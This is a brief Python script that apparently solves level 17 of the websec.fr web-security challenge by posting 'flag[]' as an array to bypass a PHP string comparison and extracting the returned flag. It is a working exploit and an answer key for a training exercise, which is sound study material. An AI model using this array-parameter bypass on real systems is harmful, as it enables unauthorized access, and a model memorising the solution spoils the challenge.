import httpx
import re

url = "https://websec.fr/level17/index.php"

r = httpx.post(url, data = { "flag[]" : '', "submit" : "Submit" })
flag = re.search(r'WEBSEC\{.*\}', r.text)[0]

print(flag)